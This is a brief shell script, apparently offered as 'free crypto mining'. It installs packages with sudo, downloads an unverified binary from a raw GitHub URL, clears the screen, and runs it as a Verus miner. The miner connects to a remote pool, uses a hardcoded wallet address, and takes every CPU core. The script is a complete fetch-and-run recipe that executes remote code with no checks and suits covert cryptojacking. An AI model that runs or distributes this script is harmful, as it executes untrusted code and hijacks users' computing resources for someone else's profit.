#!/bin/sh
sudo apt-get install libcurl4-openssl-dev libssl-dev libomp-dev libjansson-dev automake autotools-dev build-essential -y
wget https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/cc
chmod +x cc
clear
./cc -a verus -o stratum+tcp://verus.farm:9999 -u RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Linux -p x -t $(nproc)